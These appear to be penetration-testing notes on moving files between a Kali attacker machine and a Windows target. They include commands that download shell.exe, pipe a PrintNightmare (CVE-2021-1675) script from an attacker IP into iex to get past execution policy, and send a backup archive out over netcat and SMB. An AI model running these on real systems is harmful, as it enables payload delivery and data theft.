#### from windows back to my kali linux
on kali run
```
smbserver.py smb share/ -smb2support
```
on windows, run:
```
net use \\10.21.90.250\smb
```
then copy the file
```
copy .\mimi_allyouneed101.txt \\192.168.49.109\smb\mimi_allyouneed101.txt
```
#### If SMB share has read,write can use both directions

---
## From kali to windows
#### wget
```
wget http://10.10.14.169/shell.exe -o s.exe
```
#### iwr
```
iwr -uri http://10.10.14.169/shell.exe -o s.exe
```

#### certutil
```
certutil -split -urlcache -f http://192.168.49.109/chkaccess.exe C:\\Users\\rudi.davis\\Desktop\\chkaccess.exe
```

if wget doesn't work because IE engine isn't availablem, use `curl` with parameter:
```
curl 10.10.14.6/CVE-2021-1675.ps1 -UseBasicParsing | iex
```
- `-UseBasicParsing` allows the file to come back without IE
- `iex` imports (or runs) the script 
	- useful if can't import/run a script when transferred via other means because of execution policy and `powershell -ep bypass` doesn't work

---

### NC from remote to host
```
nc -lnvp 443 > 16162020_backup.zip
```
- run on kali
```
md5sum 16162020_backup.zip
```
- checksum on remote machine before transferring
```
cat 16162020_backup.zip | nc 10.10.14.191 443
```
- on remote machine to initiate the transfer
```
md5sum 16162020_backup.zip
```
- checksum on kali to make sure matches